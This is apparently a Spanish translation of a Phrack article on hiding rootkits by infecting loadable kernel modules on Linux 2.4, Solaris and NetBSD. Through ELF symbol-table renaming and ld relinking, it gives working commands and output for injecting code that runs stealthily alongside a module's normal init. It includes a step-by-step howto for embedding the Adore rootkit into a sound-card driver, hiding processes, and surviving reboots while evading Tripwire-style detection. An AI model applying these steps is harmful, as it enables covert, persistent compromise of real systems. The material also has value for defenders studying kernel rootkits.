                           ==Phrack Inc.==

              Volume 0x0b, Issue 0x3d, Phile #0x0a of 0x0f

|=-----------=[ Infectando los módulos cargables del Kernel ]=-----------=|
|=-----------------------------------------------------------------------=|
|=--------------------=[ truff  <truff@projet7.org> ]=-------------------=|


--[ Contenidos

        1 - Introducción

        2 - ELF basico
          2.1 - La seccion .symtab
          2.2 - La seccion .strtab

        3 - Jugando con los módulos cargables del Kernel (LKM's)
          3.1 - Cargando modulos
          3.2 - Modificando .strtab
          3.3 - Inyectando Codigo
          3.4 - Manteniéndonos ocultos

        4 - Ejemplos prácticos
          4.1 - Infectando LKM's mini-howto
          4.2 - Sobreviviendo(a un reinicio)

        5 - Que hay sobre los otros sistemas ?
          5.1 - Solaris
          5.2 - *BSD
            5.2.1 - FreeBSD
            5.2.2 - NetBSD
            5.2.3 - OpenBSD

        6 - Conclusión

        7 - Agradecimientos

        8 - Referencias

        9 - Código
          9.1 - ElfStrChange
          9.2 - Lkminject




--[ 1 - Introducción

  Hace algunos años pudimos observar un montón de rootkits usando los módulos
cargables del Kernel. Era solo una moda? en realidad no, los LKM's son altamente
usados ya que son realmente poderosos: Podemos esconder archivos, procesos y hacer
cosas muy divertidas. Los primeros rootkits que aprovechaban los LKM's podían ser
detectados fácilmente ya que podían ser listados editando lsmod. Hemos visto un
montón de técnicas para esconder módulos, como la usada en Plaguez's paper [1] o
una mas ingeniosa usada en el Adore Rootkit [2]. Durante los años han aparecido
nuevas técnicas basadas en la modificación de la imagen en memoria del Kernel
usando /dev/kmem [3]. Finalmente y para nuestro alivio la técnica de parchear un
Kernel estático fue presentada [4]. Esta resolvía un importante problema:
El rootkit podría ser recargado después de un reinicio.

  El fin de este documento es describir una nueva técnica usada para esconder LKM's
la cual nos asegurara que estos podrán ser recargados después del reinicio. 
Vamos a aprender como hacer esto infectando modulos del Kernel que estan siendo
usados por el sistema. En esta ocasión nos centraremos en la serie 2.4.x del Kernel
de Linux para arquitecturas x86 aunque esta técnica se puede aplicar en cualquier
sistema operativo que use el formato ELF. Algunos conocimientos son necesarios para
entender esta técnica. Los módulos del Kernel son objectos ELF por lo que estudiaremos
el formato ELF centrándonos particularmente en algunas partes relacionadas a los
símbolos llamados en un objeto ELF. Después de esto, estaremos listos para estudiar el
mecanismo usado para cargar los módulos lo cual nos dará algunos conocimientos útiles
para poder llevar a cabo la técnica que nos permitirá inyectar código en los módulos
del Kernel. Finalmente, veremos como es posible inyectar un modulo dentro de otro a
través de un ejemplo practico.



--[ 2 - ELF Básico

  El formato ejecutable y enlazado (Executable and Linking Format - ELF) es el formato
de archivo ejecutable usado en el sistema operativo Linux. Vamos a echarle un vistazo
a la parte de este formato que nos interesa y que nos será útil mas tarde (Lee [1]
para tener una descripción completa de el formato ELF).  Cuando enlazamos dos objetos
ELF el enlazador necesita saber algunos datos referentes a los símbolos contenidos en
cada objeto. Todos los objetos ELF (Por ejemplo los LKM's) contienen dos secciones cuyo
rol es almacenar una estructura de información describiendo cada símbolo. Nosotros vamos
a estudiarlos obteniendo algunas ideas que serán de utilidad a la hora de infectar los
módulos del Kernel.


----[ 2.1 - La sección .symtab

  Esta sección es una tabla de la estructura que contiene la información requerida por
el enlazador para usar los símbolos contenidos en el fichero del objeto ELF. Esta
estructura es definida en el fichero /usr/include/elf.h:

/* Symbol table entry.  */

typedef struct
{
  Elf32_Word	st_name;	/* Symbol name (string tbl index) */
  Elf32_Addr	st_value;	/* Symbol value */
  Elf32_Word	st_size;	/* Symbol size */
  unsigned char	st_info;	/* Symbol type and binding */
  unsigned char	st_other;	/* Symbol visibility */
  Elf32_Section	st_shndx;	/* Section index */
} Elf32_Sym;

En este caso el único campo que nos interesa conocer es st_name. Este campo 
es un índice de la sección .strtab en donde se almacenan los nombres de los 
símbolos


----[ 2.2 - La sección .strtab

  La sección .strtab es una tabla que contiene cadenas de terminación nula. 
Como ya dijimos, el campo st_name de la estructura Elf32_Sym es un índice de la
sección .strtab, gracias a esto podríamos obtener fácilmente el offset de la cadena
que contiene el nombre de los símbolos siguiendo la siguiente formula :

  offset_sym_name = offset_strtab + st_name

  offset_strtab es el offset de la sección .strtab desde el comienzo de el archivo.
Lo podemos obtener a través de un mecanismo de resolución del nombre de la sección el
cual no describiré en este documento ya que no es de ningún interés respecto al tema
central del texto. Este mecanismo es descrito por completo en [5] e implementado en
el código. (párrafo 9.1).

  Una vez podamos deducir cual es el nombre del símbolo en un objeto ELF podremos
acceder fácilmente a el y modificarlo. Sin embargo debemos cumplir una regla para poder
aplicar las modificaciones. Dijimos que la sección .strtab es una sucesión de cadenas
con terminación nula, esto implica una restricción en los nuevos nombres de los símbolos
después de modificarlos: la longitud de el nuevo nombre para el símbolo debe ser menor o
igual a la longitud del nombre original ya que sobrepasándolo podríamos causar un
overflow en el nombre del siguiente símbolo ubicado en la sección .strtab.

  Después de hacer una simple modificación al nombre del símbolo podremos dirigirnos
a la modificación de la operación normal de un modulo del Kernel y finalmente a la
infección de un modulo a través de otro.


--[ 3 - Jugando con los módulos cargables del Kernel (LKM's)

  El propósito de la próxima sección es mostrar el código que cargara dinámicamente 
el modulo. Con este concepto en mente, ya podremos deducir el funcionamiento de la 
técnica que nos permitirá inyectar código en un modulo.


----[ 3.1 - Cargando módulos

  Los módulos del Kernel son cargados con la utilidad del sector de usuario INSMOD
que forma parte del paquete modutils[6]. La parte que nos interesa a nosotros es la
función init_module() de el fichero insmod.c.

static int init_module(const char *m_name, struct obj_file *f,
        unsigned long m_size, const char *blob_name,
        unsigned int noload, unsigned int flag_load_map)
{
(1)     struct module *module;
        struct obj_section *sec;
        void *image;
        int ret = 0;
        tgt_long m_addr;

        ....

(2)     module->init = obj_symbol_final_value(f,
                obj_find_symbol(f, "init_module"));
(3)     module->cleanup = obj_symbol_final_value(f,
                obj_find_symbol(f, "cleanup_module"));

        ....

        if (ret == 0 && !noload) {
                fflush(stdout);         /* Flush any debugging output */
(4)             ret = sys_init_module(m_name, (struct module *) image);
                if (ret) {
                        error("init_module: %m");
                        lprintf(
      "Hint: insmod errors can be caused by incorrect module parameters, "
      "including invalid IO or IRQ parameters.\n"
      "You may find more information in syslog or the output from dmesg");
                }
        }

  Esta función es usada (1) para llenar un modulo estructurado el cual contiene la
información necesaria para cargar el modulo objetivo. Los campos que nos interesan
son init_module y cleanup_module los cuales sirven como indicadores que apuntan
respectivamente hacia el init_module() y cleanup_module() de el modulo recién cargado.
La función (2) obj_find_symbol() extrae la estructura de símbolos atravesando la tabla
de símbolos en busca del símbolo cuyo nombre es init_module. Esta estructura se le
pasa a obj_symbol_final_value() el cual extrae la dirección de la función init_module
desde la estructura de símbolos. La misma operación es realizada (3) por la función
cleanup_module(). Esto es necesario para recordar que la función que será llamada
cuando inicie y termine el modulo será la entrada de la sección .strtab que corresponda
respectivamente a init_module y cleanup_module.

  Cuando el modulo estructurado es completamente llenado en (4) la syscall
sys_init_module() es llamada para dejar al Kernel cargar el modulo.

  Hache se encuentra la parte interesante de la syscall sys_init_module() la 
cual es llamada durante la carga del modulo. El código que contiene esta función se
ubica en el archivo /usr/src/linux/kernel/module.c:

asmlinkage long
sys_init_module(const char *name_user, struct module *mod_user)
{
        struct module mod_tmp, *mod;
        char *name, *n_name, *name_tmp = NULL;
        long namelen, n_namelen, i, error;
        unsigned long mod_user_size;
        struct module_ref *dep;

        /* Lots of sanity checks */
        .....
        /* Ok, that's about all the sanity we can stomach; copy the rest.*/

(1)     if (copy_from_user((char *)mod+mod_user_size,

                           (char *)mod_user+mod_user_size,
                           mod->size-mod_user_size)) {
                error = -EFAULT;
                goto err3;
        }

        /* Other sanity checks */

        ....

        /* Initialize the module.  */
        atomic_set(&mod->uc.usecount,1);
        mod->flags |= MOD_INITIALIZING;
(2)     if (mod->init && (error = mod->init()) != 0) {
                atomic_set(&mod->uc.usecount,0);
                mod->flags &= ~MOD_INITIALIZING;
                if (error > 0)  /* Buggy module */
                        error = -EBUSY;
                goto err0;
        }
        atomic_dec(&mod->uc.usecount);

Después de un par de checkeos, el modulo estructurado es copiado desde el sector
de usuario a el sector del Kernel a través de la llamada(1) copy_from_user().
Después (2) la función init_module() del modulo recién cargado es llamada usando
la función mod->init() la cual apunta a la que ah sido recientemente llenada por
la utilidad insmod.


----[ 3.2 - Modificando .strtab

  Hemos visto que la dirección de la función inicial de los módulos puede ser
encontrada usando una cadena de la sección .strtab. La modificación de esta cadena
puede permitirnos la ejecución de otra función además de init_module() cuando el
modulo es cargado.
  Hay varias maneras para modificar una entrada de la seccion .strtab. La opción
-wrap de ld puede ser usada para hacer esto pero esta opción no es compatible con
la opción -r la cual necesitaremos mas tarde (párrafo 3.3). En el párrafo 5.1
podremos observar como usar xxd para hacer el trabajo. Eh codeado una herramienta
(párrafo 9.1) que automatiza esta tarea.

Aqui hay un peque~o ejemplo:

$ cat test.c
#define MODULE

#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void)
{
  printk ("<1> Into init_module()\n");
  return 0;
}

int evil_module(void)
{
  printk ("<1> Into evil_module()\n");
  return 0;
}

int cleanup_module(void)
{
  printk ("<1> Into cleanup_module()\n");
  return 0;
}

$ cc -O2 -c test.c

  Demosle una mirada a las secciones .symtab and .strtab:

$ objdump -t test.o

test.o:     file format elf32-i386

SYMBOL TABLE:
0000000000000000 l    df *ABS*  0000000000000000 test.c
0000000000000000 l    d  .text  0000000000000000
0000000000000000 l    d  .data  0000000000000000
0000000000000000 l    d  .bss   0000000000000000
0000000000000000 l    d  .modinfo  0000000000000000
0000000000000000 l     O .modinfo  0000000000000016 __module_kernel_version
0000000000000000 l    d  .rodata   0000000000000000
0000000000000000 l    d  .comment  0000000000000000
0000000000000000 g     F .text  0000000000000014 init_module
0000000000000000         *UND*  0000000000000000 printk
0000000000000014 g     F .text  0000000000000014 evil_module
0000000000000028 g     F .text  0000000000000014 cleanup_module

  Ahora modificaremos 2 entradas de la sección .strtab para hacer que el nombre 
del símbolo evil_module cambie a init_module. Primero debemos renombrar el símbolo
init_module ya que dos símbolos de la misma naturaleza no pueden tener el mismo
nombre en un mismo objeto ELF. Debemos realizar las siguientes operaciones:

		renombrar
1)  init_module  ---->  dumm_module
2)  evil_module  ---->  init_module


$ ./elfstrchange test.o init_module dumm_module
[+] Symbol init_module located at 0x3dc
[+] .strtab entry overwriten with dumm_module

$ ./elfstrchange test.o evil_module init_module
[+] Symbol evil_module located at 0x3ef
[+] .strtab entry overwriten with init_module

$ objdump -t test.o

test.o:     file format elf32-i386

SYMBOL TABLE:
0000000000000000 l    df *ABS*  0000000000000000 test.c
0000000000000000 l    d  .text  0000000000000000
0000000000000000 l    d  .data  0000000000000000
0000000000000000 l    d  .bss   0000000000000000
0000000000000000 l    d  .modinfo  0000000000000000
0000000000000000 l     O .modinfo  0000000000000016 __module_kernel_version
0000000000000000 l    d  .rodata   0000000000000000
0000000000000000 l    d  .comment  0000000000000000
0000000000000000 g     F .text  0000000000000014 dumm_module
0000000000000000         *UND*  0000000000000000 printk
0000000000000014 g     F .text  0000000000000014 init_module
0000000000000028 g     F .text  0000000000000014 cleanup_module


# insmod test.o
# tail -n 1 /var/log/kernel
May  4 22:46:55 accelerator kernel:  Into evil_module()

  Como podemos ver, en lugar de llamar a la función init_module() se ah 
Llamado a la función evil_module().

----[ 3.3 - Inyectando código

  La técnica anterior nos posibilita la ejecución de una función dentro de otra,
en realidad esto no es muy interesante. Seria mucho mejor poder inyectar código
externo dentro de los módulos. Esto puede lograrse *fácilmente* usando el
maravilloso enlazador: ld.

$ cat original.c
#define MODULE
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void)
{
  printk ("<1> Into init_module()\n");
  return 0;
}

int cleanup_module(void)
{
  printk ("<1> Into cleanup_module()\n");
  return 0;
}

$ cat inject.c
#define MODULE
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>


int inje_module (void)
{
  printk ("<1> Injected\n");
  return 0;
}

$ cc -O2 -c original.c
$ cc -O2 -c inject.c


  Aquí comienza lo importante. La inyección de código no es un problema ya que
los módulos del kernel son objetos ELF reubicables. Este tipo de objetos pueden
ser enlazados entre si para compartir símbolos y complementarse entre ellos mismo.
Como sea debemos cumplir una regla: no puede existir el mismo símbolo en Diversos
módulos que se encuentren enlazados. Usaremos ld con la opción -r para hacer un
link parcial el cual creara un objeto de la misma naturaleza al cual ha sido
enlazado. Esto crearía un modulo que podría ser cargado por el Kernel.

$ ld -r original.o inject.o -o evil.o
$ mv evil.o original.o
$ objdump -t original.o

original.o:     file format elf32-i386

SYMBOL TABLE:
0000000000000000 l    d  .text  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  .rodata   0000000000000000
0000000000000000 l    d  .modinfo  0000000000000000
0000000000000000 l    d  .data  0000000000000000
0000000000000000 l    d  .bss   0000000000000000
0000000000000000 l    d  .comment  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    df *ABS*  0000000000000000 original.c
0000000000000000 l     O .modinfo  0000000000000016 __module_kernel_version
0000000000000000 l    df *ABS*  0000000000000000 inject.c

0000000000000016 l     O .modinfo  0000000000000016 __module_kernel_version
0000000000000014 g     F .text  0000000000000014 cleanup_module
0000000000000000 g     F .text  0000000000000014 init_module
0000000000000000         *UND*  0000000000000000 printk
0000000000000028 g     F .text  0000000000000014 inje_module


  La función inje_module() ah sido enlazada dentro del modulo. Ahora vamos a
modificar la sección .strtab para que llame a inje_module() en vez de init_module().


$ ./elfstrchange original.o init_module dumm_module
[+] Symbol init_module located at 0x4a8
[+] .strtab entry overwriten with dumm_module

$ ./elfstrchange original.o inje_module init_module
[+] Symbol inje_module located at 0x4bb
[+] .strtab entry overwriten with init_module


  Dejémoslo arder:

# insmod original.o
# tail -n 1 /var/log/kernel
May 14 20:37:02 accelerator kernel:  Injected

  Y la magia fluye :)


----[ 3.4 - Manteniéndonos ocultos

La mayoría de las veces, podremos infectar un modulo en uso. Si reemplazamos
la función init_module() por otra, el modulo perdería su propósito original
para nuestro provecho. Como sea, si el modulo infectado no trabaja apropiadamente,
podrá ser fácilmente detectado. Pero hay una solución que nos permitirá inyectar
código dentro de un modulo sin modificar su conducta normal. Después de hackear
la sección .strtab, la verdadera función init_module() pasara a llamarse
dumm_module. Si ponemos una llamada a dumm_module() dentro de nuestra función
evil_module() , el verdadero init_module() podría ser llamado al inicio manteniendo
la conducta normal del modulo.


                 Reemplazar
    init_module  ------>  dumm_module
    inje_module  ------>  init_module (debemos llamar a dumm_module)


$ cat stealth.c
#define MODULE
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>


int inje_module (void)
{
  dumm_module ();
  printk ("<1> Injected\n");
  return 0;
}

$ cc -O2 -c stealth.c
$ ld -r original.o stealth.o -o evil.o
$ mv evil.o original.o
$ ./elfstrchange original.o init_module dumm_module
[+] Symbol init_module located at 0x4c9
[+] .strtab entry overwriten with dumm_module

$ ./elfstrchange original.o inje_module init_module
[+] Symbol inje_module located at 0x4e8
[+] .strtab entry overwriten with init_module

# insmod original.o
# tail -n 2 /var/log/kernel
May 17 14:57:31 accelerator kernel:  Into init_module()
May 17 14:57:31 accelerator kernel:  Injected


Perfecto, la inyeccion de codigo se ejecutara despues del funcionamiento 
Regular del modulo manteniendose oculto.


--[ 4 - Ejemplos practicos

  El método usado para modificar init_module() en la técnica anterior puede Ser
aplicado sin problemas a la fusión cleanup_module() . De este modo, podremos
inyectar un modulo completo dentro de otro.  Eh inyectado el conocido Adore[2]
rootkit dentro de mi tarjeta de sonido (i810_audio.o) siguiendo unos simples pasos.

----[ 4.1 - Infectando LKM's mini-howto

1) Primero le haremos unas pequeñas modificaciones al adore.c

  * Insertaremos una llamada a dumm_module() en el código que contiene la 
función init_module()
  * Insertaremos una llamada a dummcle_module() en el código que contiene el 
modulo cleanup_module()
  * Reemplazaremos el nombre de la función init_module por evil_module
  * Reemplazaremos el nombre de la función cleanup_module por evclean_module


2) Compilamos Adore usando make


3) Link adore.o with i810_audio.o

   ld -r i810_audio.o adore.o -o evil.o

   Si el modulo ya esta cargado, debemos removerlo:
   rmmod i810_audio

   mv evil.o i810_audio.o


4) Modificamos la sección .strtab

                 Reemplazar
  init_module    ------> dumm_module
  evil_module    ------> init_module (con la llamada dumm_module)

  cleanup_module ------> evclean_module
  evclean_module ------> cleanup_module (con la llamada evclean_module)

$ ./elfstrchange i810_audio.o init_module dumm_module
[+] Symbol init_module located at 0xa2db
[+] .strtab entry overwriten with dumm_module

$ ./elfstrchange i810_audio.o evil_module init_module
[+] Symbol evil_module located at 0xa4d1
[+] .strtab entry overwriten with init_module

$ ./elfstrchange i810_audio.o cleanup_module dummcle_module
[+] Symbol cleanup_module located at 0xa169
[+] .strtab entry overwriten with dummcle_module

$ ./elfstrchange i810_audio.o evclean_module cleanup_module
[+] Symbol evclean_module located at 0xa421
[+] .strtab entry overwriten with cleanup_module


5) Cargar y probar el modulo

# insmod i810_audio
# ./ava
Usage: ./ava {h,u,r,R,i,v,U} [file, PID or dummy (for U)]

       h hide file
       u unhide file
       r execute as root
       R remove PID forever
       U uninstall adore
       i make PID invisible
       v make PID visible

# ps
  PID TTY          TIME CMD
2004 pts/3    00:00:00 bash
2083 pts/3    00:00:00 ps

# ./ava i 2004
Checking for adore  0.12 or higher ...
Adore 0.53 installed. Good luck.
Made PID 2004 invisible.

root@accelerator:/home/truff/adore# ps
  PID TTY          TIME CMD
#

Hermoso :) Eh codeado un pequeño shell script(parrafo 9.2) que
automatiza algunas partes de el trabajo para los vagos.


----[ 4.2 - Sobreviviendo (a un reinicio)

  Cuando el modulo es cargado, tenemos dos opciones con sus Pros y sus 
Contra:

  * Reemplazar el verdadero modulo ubicado en /lib/modules/ por nuestro 
modulo infectado.
    Esto nos aseguraría que nuestro backdoor seria recargado después de un reinicio.
Pero, si hacemos esto correremos el riesgo de que nos detecte una HIDS (Sistema de
detección de Host Intrusos) como Tripwire [7]. Como sea, un modulo del Kernel no es
un ejecutable o un fichero con suid, por lo que la única manera de no ser detectado
es que el HIDS no este configurado de forma paranoica.

  * Dejar el modulo verdadero del Kernel sin cambios en /lib/modules y borrar
nuestro modulo infectado. Nuestro modulo podrá ser removido cuando se reinicie,
pero si no quieres ser detectado por una HIDS ella mirara en busca de algún cambio
en los archivos.



--[ 5 - Que hay sobre los otros sistemas ?

----[ 5.1 - Solaris

Eh usado un modulo básico del Kernel de [8] para llevar a cabo el ejemplo.
Los módulos del Kernel Solaris cuentan con 3 funciones principales:
  - _init puede ser llamado como un modulo initialisation
  - _fini puede ser llamado como un modulo cleanup
  - _info muestra info sobre el modulo cuando editamos un modinfo

$ uname -srp
SunOS 5.7 sparc

$ cat mod.c
#include <sys/ddi.h>
#include <sys/sunddi.h>
#include <sys/modctl.h>

extern struct mod_ops mod_miscops;

static struct modlmisc modlmisc = {
        &mod_miscops,
        "Real Loadable Kernel Module",
};

static struct modlinkage modlinkage = {
        MODREV_1,
        (void *)&modlmisc,
        NULL
};

int _init(void)
{
        int i;
        if ((i = mod_install(&modlinkage)) != 0)
                cmn_err(CE_NOTE,"Could not install module\n");
        else

                cmn_err(CE_NOTE,"mod: successfully installed");
        return i;
}

int _info(struct modinfo *modinfop)
{
        return (mod_info(&modlinkage, modinfop));
}

int _fini(void)
{
        int i;
        if ((i = mod_remove(&modlinkage)) != 0)
                cmn_err(CE_NOTE,"Could not remove module\n");
        else
                cmn_err(CE_NOTE,"mod: successfully removed");
        return i;
}


$ gcc -m64 -D_KERNEL -DSRV4 -DSOL2 -c mod.c
$ ld -r -o mod mod.o
$ file mod
mod:            ELF 64-bit MSB relocatable SPARCV9 Version 1


  Como pudimos ver en el caso de Linux, el código que vamos a inyectar contiene
un llamado a la función init real para lograr que el modulo mantenga su
funcionamiento regular. Como sea, tendremos que enfrentar un problema: si 
modificamos la sección .strtab después del enlazamiento, el cargador dinámico 
no encontrara la función _dumm() y el modulo no podrá ser cargado. No eh 
investigado mucho sobre este problema pero creo que el cargador dinámico para
Solaris no busca simbolos indefinidos dentro del modulo mismo.Como sea, este
problema puede ser fácilmente resuelto. Si cambiamos la verdadera entrada _init
de .strtab por _dumm antes del enlazamiento, todo marchara bien.


$ readelf -S mod
Tenemos 10 secciones, empezando por el offset 0x940:

Encabezados de las Secciones:

  [Nr] Name              Type             Adress             Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .text             PROGBITS         0000000000000000  00000040
       0000000000000188  0000000000000000  AX       0     0     4
  [ 2] .rodata           PROGBITS         0000000000000000  000001c8
       000000000000009b  0000000000000000   A       0     0     8
  [ 3] .data             PROGBITS         0000000000000000  00000268
       0000000000000050  0000000000000000  WA       0     0     8
  [ 4] .symtab           SYMTAB           0000000000000000  000002b8
       0000000000000210  0000000000000018           5     e     8
  [ 5] .strtab           STRTAB           0000000000000000  000004c8
       0000000000000065  0000000000000000           0     0     1
  [ 6] .comment          PROGBITS         0000000000000000  0000052d
       0000000000000035  0000000000000000           0     0     1
  [ 7] .shstrtab         STRTAB           0000000000000000  00000562
       000000000000004e  0000000000000000           0     0     1
  [ 8] .rela.text        RELA             0000000000000000  000005b0
       0000000000000348  0000000000000018           4     1     8
  [ 9] .rela.data        RELA             0000000000000000  000008f8
       0000000000000048  0000000000000018           4     3     8
Teclas:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)


  La sección .strtab comienza en el offset 0x4c8 y tiene un tamaño de 64 bytes.
Vamos a usar VI y XXD como editor hexadecimal. Cargamos el modulo en el VI con:
vi mod. Después usamos:%!xxd para convertir el modulo a valores hexadecimales.

Deberiamos poder ver algo como esto:

00004c0: 0000 0000 0000 0000 006d 6f64 006d 6f64  .........mod.mod
00004d0: 2e63 006d 6f64 6c69 6e6b 6167 6500 6d6f  .c.modlinkage.mo
00004e0: 646c 6d69 7363 006d 6f64 5f6d 6973 636f  dlmisc.mod_misco
00004f0: 7073 005f 696e 666f 006d 6f64 5f69 6e73  ps._info.mod_ins
0000500: 7461 6c6c 005f 696e 6974 006d 6f64 5f69  tall._init.mod_i
                        ^^^^^^^^^

  Modificaremos 4 bytes para reemplazar _init por _dumm.

00004c0: 0000 0000 0000 0000 006d 6f64 006d 6f64  .........mod.mod
00004d0: 2e63 006d 6f64 6c69 6e6b 6167 6500 6d6f  .c.modlinkage.mo
00004e0: 646c 6d69 7363 006d 6f64 5f6d 6973 636f  dlmisc.mod_misco
00004f0: 7073 005f 696e 666f 006d 6f64 5f69 6e73  ps._info.mod_ins
0000500: 7461 6c6c 005f 6475 6d6d 006d 6f64 5f69  tall._init.mod_i
                        ^^^^^^^^^
Usaremos :%!xxd -r para volver al estado original del modulo, luego Guardamos y
salimos :wq . Luego verificamos que los cambios hayan sido correctamente realizados.

$ objdump -t mod

mod:     file format elf64-sparc

SYMBOL TABLE:
0000000000000000 l    df *ABS*  0000000000000000 mod
0000000000000000 l    d  .text  0000000000000000
0000000000000000 l    d  .rodata        0000000000000000
0000000000000000 l    d  .data  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  .comment       0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    d  *ABS*  0000000000000000
0000000000000000 l    df *ABS*  0000000000000000 mod.c
0000000000000010 l     O .data  0000000000000040 modlinkage
0000000000000000 l     O .data  0000000000000010 modlmisc
0000000000000000         *UND*  0000000000000000 mod_miscops
00000000000000a4 g     F .text  0000000000000040 _info
0000000000000000         *UND*  0000000000000000 mod_install
0000000000000000 g     F .text  0000000000000188 _dumm
0000000000000000         *UND*  0000000000000000 mod_info
0000000000000000         *UND*  0000000000000000 mod_remove
00000000000000e4 g     F .text  0000000000000188 _fini
0000000000000000         *UND*  0000000000000000 cmn_err


  El símbolo _init ah sido reemplazado por _dumm. Ahora podemos inyectar 
directamente una función con el nombre de _init sin ningún problema.

$ cat evil.c
int _init(void)
{
        _dumm ();
        cmn_err(1,"evil: successfully installed");
        return 0;
}

$ gcc -m64 -D_KERNEL -DSRV4 -DSOL2 -c inject.c
$ ld -r -o inject inject.o

  La parte de la inyección usando ld:

$ ld -r -o evil mod inject

  Carga el modulo:

# modload evil
# tail -f /var/adm/messages
Jul 15 10:58:33 luna unix: NOTICE: mod: successfully installed
Jul 15 10:58:33 luna unix: NOTICE: evil: successfully installed


  La misma operación puede ser aplicada a la función _fini para inyectar
un modulo completo dentro de otro



----[ 5.2 - *BSD

------[ 5.2.1 - FreeBSD

% uname -srm
FreeBSD 4.8-STABLE i386

% file /modules/daemon_saver.ko
daemon_saver.ko: ELF 32-bit LSB shared object, Intel 80386, version 1
(FreeBSD), not stripped

  Como podemos ver, los módulos del Kernel FreeBSD son objetos compartidos. Por
lo tanto, no podemos usar ld para enlazar código adicional dentro del modulo. Como
consecuencia el mecanismo usado para cargar el modulo será completamente diferente
a la técnica usada en sistemas Linux o Solaris. Puedes echarle un vistazo a
/usr/src/sys/kern/kern_linker.c . Cualquier nombre puede ser usado para la función
init/cleanup. Al inicio el cargador encontrara la dirección de la función init
dentro de una estructura ubicada en la sección .data. Después el hack hecho a la
sección .strtab tampoco servirá.



------[ 5.2.2 - NetBSD

$ file nvidia.o
nvidia.o: ELF 32-bit LSB relocatable, Intel 80386, version 1
(SYSV), not stripped

  Podemos inyectar código dentro de los módulos del Kernel NetBSD por que son 
objetos ELF reubicables. Cuando el modload cargué un modulo del Kernel este se
enlaza con el Kernel y ejecuta el código colocado en el punto de entrada de el
modulo (Ubicado en la cabecera ELF).   Después del enlazamiento podremos cambiar
el punto de entrada, pero esto no será necesario ya que el modload trae una opción
especial(-e) que permite decirle cual es el símbolo que usara para el punto de entrada.

  Aquí esta el modulo de ejemplo que vamos a infetar:

$ cat gentil_lkm.c
#include <sys/cdefs.h>
#include <sys/param.h>
#include <sys/ioctl.h>
#include <sys/systm.h>
#include <sys/conf.h>
#include <sys/lkm.h>

MOD_MISC("gentil");

int	gentil_lkmentry(struct lkm_table *, int, int);
int	gentil_lkmload(struct lkm_table *, int);
int	gentil_lkmunload(struct lkm_table *, int);
int	gentil_lkmstat(struct lkm_table *, int);

int gentil_lkmentry(struct lkm_table *lkmt, int cmd, int ver)
{
	DISPATCH(lkmt, cmd, ver, gentil_lkmload, gentil_lkmunload,
	    gentil_lkmstat);
}

int gentil_lkmload(struct lkm_table *lkmt, int cmd)
{
	printf("gentil: Hello, world!\n");
	return (0);
}

int gentil_lkmunload(struct lkm_table *lkmt, int cmd)
{
	printf("gentil: Goodbye, world!\n");
	return (0);
}

int gentil_lkmstat(struct lkm_table *lkmt, int cmd)
{
	printf("gentil: How you doin', world?\n");
	return (0);
}


  Here's the code that will be injected:

$ cat evil_lkm.c
#include <sys/cdefs.h>
#include <sys/param.h>
#include <sys/ioctl.h>
#include <sys/systm.h>
#include <sys/conf.h>
#include <sys/lkm.h>

int	gentil_lkmentry(struct lkm_table *, int, int);

int
inject_entry(struct lkm_table *lkmt, int cmd, int ver)
{
	switch(cmd) {
	case LKM_E_LOAD:
		printf("evil: in place\n");
		break;
	case LKM_E_UNLOAD:
		printf("evil: i'll be back!\n");
		break;
	case LKM_E_STAT:
		printf("evil: report in progress\n");
		break;
	default:
		printf("edit: unknown command\n");
		break;
	}

	return gentil_lkmentry(lkmt, cmd, ver);
}

  After compiling gentil and evil we link them together:

$ ld -r -o evil.o gentil.o inject.o
$ mv evil.o gentil.o

# modload -e evil_entry gentil.o
Module loaded as ID 2

# modstat
Type    Id   Offset Loadaddr Size Info     Rev Module Name
DEV       0  -1/108 d3ed3000 0004 d3ed3440   1 mmr
DEV       1  -1/180 d3fa6000 03e0 d4090100   1 nvidia
MISC      2       0 e45b9000 0004 e45b9254   1 gentil

# modunload -n gentil

# dmesg | tail
evil: in place
gentil: Hello, world!
evil: report in progress
gentil: How you doin', world?
evil: i'll be back!
gentil: Goodbye, world!


  Ok, todo funciona de maravilla :)


------[ 5.2.3 - OpenBSD

  OpenBSD no usa el formato ELF en arquitecturas x86, así que la técnica no puede
ser usada. No eh probado en plataformas en las que si use ELF pero creo que es
parecido a NetBSD, asi que la técnica debería poder ser aplicable. Si has logrado
hacerlo en un OpenBSD no olvides decírmelo.



--[ 6 - Conclusión

  Este texto ah listado una serie de técnicas que nos permitirán esconder código 
en un Kernel. Eh presentado esta técnica por que es muy interesante, hay muchas 
maneras de hacerlo y es fácil manipularla.
  Diviértanse jugando con ella:)



--[ 7 - Agradecimientos

  Quisiera agradecer a mycroft, OUAH, aquí y afrique por sus comentarios e
ideas. También un gran agradecimiento a klem por enseñarme ingeniería inversa.
  Gracias a FXKennedy por ayudarme con NetBSD.
  Un gran beso a Carla por ser tan maravillosa.
  y finalmente, gracias a toda la gente de #root, `spud, hotfyre, funka, 
jaia, climax, redoktober ...



--[ 8 - Referencias


  [1] Debilitando el Kernel de Linux por Plaguez
      http://www.phrack.org/show.php?p=52&a=18

  [2] Ocultando el Adore Rootkit
      http://stealth.7350.org/rootkits/

  [3] Parcheando un Kernel en ejecucion con Kmem por Silvio Cesare
      http://vx.netlux.org/lib/vsc07.html

  [4] Parcheando un Kernel estatico por jbtzhm
      http://www.phrack.org/show.php?p=60&a=8

  [5] Tool interface specification on ELF
      http://segfault.net/~scut/cpu/generic/TIS-ELF_v1.2.pdf

  [6] Modutils para Kernels 2.4.x
      ftp://ftp.kernel.org/pub/linux/utils/kernel/modutils/v2.4

